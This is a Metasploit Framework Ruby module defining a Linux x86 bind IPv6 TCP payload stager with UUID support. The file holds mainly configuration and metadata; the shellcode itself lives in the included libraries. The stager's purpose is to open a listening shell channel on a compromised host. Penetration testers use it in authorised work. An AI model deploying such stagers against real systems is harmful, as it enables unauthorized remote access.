##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/handler/bind_tcp'
require 'msf/core/payload/linux/bind_tcp'

module MetasploitModule

  CachedSize = 165

  include Msf::Payload::Stager
  include Msf::Payload::Linux::BindTcp

  def self.handler_type_alias
    'bind_ipv6_tcp_uuid'
  end

  def initialize(info = {})
    super(merge_info(info,
      'Name'        => 'Bind IPv6 TCP Stager with UUID Support (Linux x86)',
      'Description' => 'Listen for an IPv6 connection with UUID Support (Linux x86)',
      'Author'      => [ 'kris katterjohn', 'egypt', 'OJ Reeves' ],
      'License'     => MSF_LICENSE,
      'Platform'    => 'linux',
      'Arch'        => ARCH_X86,
      'Handler'     => Msf::Handler::BindTcp,
      'Convention'  => 'sockedi',
      'Stager'      => { 'RequiresMidstager' => true }
    ))
  end

  def use_ipv6
    true
  end

  def include_send_uuid
    true
  end
end
